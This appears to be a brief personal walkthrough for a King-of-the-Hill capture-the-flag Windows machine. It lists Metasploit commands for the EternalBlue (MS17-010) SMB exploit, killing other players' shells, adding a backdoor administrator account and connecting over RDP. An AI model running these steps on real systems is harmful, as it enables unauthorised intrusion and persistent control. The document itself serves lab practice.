Offline (windows)

## Popping a shell in root:
- `http://ip:80` --> passwd OfflineTV2020

- nmap --> SMB
- `msfconsole`
	- `search ms17-010`
	- `use 4` or whatever, the psexec one
	- `options`
	- `run`
	- Root!
	- `edit /users/administrator/king-server/king.txt`
	`migrate to FreeSSHDService.exe or whatever works`
	`mkdir /root`
	`edit /root/king.txt` confuse others
	`ps | grep "cmd|powershell"` and `kill PID` to kick others out
	
Get a GUI rdp:
	
`net user USERNAME PASSWORD /add`
`net localground administrators USERNAME /add`

`xfreerdp /u:USERNAME /p:PASSWORD /v:IP /size:90%`

- `http://IP/Scarras_Super_Secret_Password.txt`

Aside: This machine sucks since eternal blue can't be patched (as far as I know) without restarting and firewalling it off isn't allowed
